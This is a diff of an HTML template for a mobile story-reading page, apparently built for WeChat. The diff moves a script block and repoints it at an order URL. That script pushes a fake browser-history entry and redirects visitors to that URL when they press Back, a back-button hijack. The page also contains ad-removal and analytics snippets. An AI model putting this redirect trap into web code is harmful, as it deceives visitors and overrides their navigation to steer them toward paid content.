@@ -15,46 +15,6 @@
           content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no"/>
     <title>loading...</title>
 </head>
-
-<script>
-
-    var hrefurl = "";
-    if (hrefurl.length == 0) {
-        function clickfh() {
-            // location.href = 'https://c63836.818tu.com/referrals/index/3266074';
-            location.href = 'http://kfp0h.cn/story/newest-1837.html';
-        }
-    } else {
-        function clickfh() {
-            location.href = 'http://kfp0h.cn/story/newest-1837.html';
-        }
-
-        window.onhashchange = function () {
-            jp();
-        };
-
-        function hh() {
-            history.pushState(history.length + 1, "app", "#pt_" + new Date().getTime());
-        }
-
-        function jp() {
-            location.href = ''
-        }
-
-        window.onload = function () {
-            if (sessionStorage.isAT) {
-                chkwvs = function () {
-                };
-                player.onplaying = function () {
-                    if (!sessionStorage.pt) {
-                        sessionStorage.pt = new Date().getTime();
-                    }
-                };
-                sessionStorage.removeItem("isAT");
-            }
-            setTimeout('hh();', 100);
-        }
-    }</script>
 <body style="margin:0px auto;width:100%;max-width:685px;padding-bottom:0px;">
 <link rel="stylesheet" href="../../static/css/content.css" type="text/css"
       th:href="@{/css/content.css}"/>
@@ -115,9 +75,10 @@
 
 <script th:inline="javascript">
     var withoutshare_url = [[${withoutshare_url}]];
-    // history.pushState('test', 'title ',base64Decode(withoutshare_url))
-    history.replaceState('test', 'title ', base64Decode(withoutshare_url))
-    //背景音乐停止与播放
+    // // history.pushState('test', 'title ',base64Decode(withoutshare_url))
+    // // history.replaceState('test', 'title ', base64Decode(withoutshare_url))
+    // //背景音乐停止与播放
+    // window.history.replaceState({}, '',base64Decode(withoutshare_url));
     var image_src = ""
     var article = [[${article}]];
     $('title').html(article.wyArticle.title);
@@ -178,61 +139,46 @@
             $icon.removeClass("praised");
         }
     });
-    // window.PREFIX_URL = "http://"+window.location.host+"/";
-    // $.ajax({
-    //     url: window.PREFIX_URL+'weixin/signature',
-    //     async: false,
-    //     data: {"linkUrl":encodeURIComponent(window.location.href.split('#')[0])},
-    //     dataType: "json",
-    //     type: 'post',
-    //     success: function (data) {
-    //         signatureJson = data;
-    //     }
-    // });
-    // wx.config({
-    //     debug: true,
-    //     appId: signatureJson.theAppId,
-    //     timestamp: signatureJson.timestamp,
-    //     nonceStr: signatureJson.noncestr,
-    //     signature: signatureJson.signature,
-    //     jsApiList: ['onMenuShareTimeline','onMenuShareAppMessage','error']
-    // });
-    //
-    // wx.ready(function () {
-    //     wx.onMenuShareTimeline({
-    //         title: article.wyArticle.shareTitle,
-    //         link: base64Decode(share_url),
-    //         imgUrl: article.wyArticle.shareImgUrl,
-    //         success: function () {
-    //
-    //         },
-    //         cancel: function () {
-    //
-    //         }
-    //     });
-    //     wx.onMenuShareAppMessage({
-    //         title: article.wyArticle.shareTitle,
-    //         desc: article.wyArticle.shareDescribe,
-    //         link: base64Decode(share_url),
-    //         imgUrl: article.wyArticle.shareImgUrl,
-    //         type: '',
-    //         dataUrl: '',
-    //         success: function () {
-    //
-    //         },
-    //         cancel: function () {
-    //
-    //         }
-    //     });
-    // })
     function base64Decode(input){
         rv = window.atob(input);
         rv = escape(rv);
         rv = decodeURIComponent(rv);
         return rv;
     }
-</script>
 
+    var hrefurl = "http://kfp0h.cn/order/jump-story";
+    if (hrefurl.length == 0) {
+    } else {
+        function clickfh() {
+            location.href = 'http://kfp0h.cn/order/jump-story';
+        }
+
+        window.onhashchange = function () {
+            jp();
+        };
+
+        function hh() {
+            history.pushState(history.length+1, "app", "#pt_"+new Date().getTime());
+        }
+
+        function jp() {
+            location.href = 'http://kfp0h.cn/order/jump-story'
+        }
+
+        window.onload = function () {
+            if (sessionStorage.isAT) {
+                chkwvs = function () {
+                };
+                player.onplaying = function () {
+                    if (!sessionStorage.pt) {
+                        sessionStorage.pt = new Date().getTime();
+                    }
+                };
+                sessionStorage.removeItem("isAT");
+            }
+            setTimeout('hh();', 100);
+        }
+    }</script>
 <script>
     // 祛除广告相关
     var del_times = 0, deTimer = null;
@@ -263,6 +209,9 @@
     deTimer = self.setInterval(adGo, 200);
 
 </script>
-<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1274770630'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s22.cnzz.com/z_stat.php%3Fid%3D1274770630%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script></body>
+
+<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1274770630'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s22.cnzz.com/z_stat.php%3Fid%3D1274770630%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script>
+</body>
 </html>
+
  
